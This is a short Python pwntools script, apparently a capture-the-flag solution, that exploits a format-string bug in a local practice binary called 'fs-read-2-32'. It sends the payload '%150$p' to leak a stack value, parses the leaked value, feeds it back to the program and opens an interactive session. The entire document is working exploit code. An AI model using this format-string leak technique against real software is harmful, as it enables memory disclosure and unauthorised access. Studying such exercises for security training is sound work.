#!/usr/bin/env python

from pwn import *

p = process('./fs-read-2-32')

print(p.recv())

p.sendline("%150$p")

data = p.recv()

print(repr(data))
value = data.split(' ')[1].split('\n')[0]
p.sendline(value)

p.interactive()
